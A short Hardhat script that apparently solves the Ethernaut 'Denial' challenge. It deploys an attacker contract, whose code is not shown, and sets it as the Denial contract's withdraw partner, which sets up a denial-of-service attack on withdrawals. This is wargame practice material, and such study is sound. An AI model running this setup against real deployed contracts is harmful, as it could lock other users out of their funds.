const { ethers } = require("hardhat");
const Runner = require("./lib/runner");
const Deployer = require("./deployer");


Runner.run(async () => {
    
    //PLACE Denial CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const contractAddr = "0x26D9a4cF4674401EEa234Aae06b6261678D2c56D";
    
    const contract = await ethers.getContractAt("Denial", contractAddr);    
    const attacker = await Deployer.deploy();
    
    console.log();
    console.log("* * *");
    console.log(`Attacker address: ${attacker.address}`);
    
    //set the attacker as partner 
    await contract.setWithdrawPartner(attacker.address);
    
    console.log(`Contract partner address: ${await contract.partner()}`);
    console.log("* * *");
});
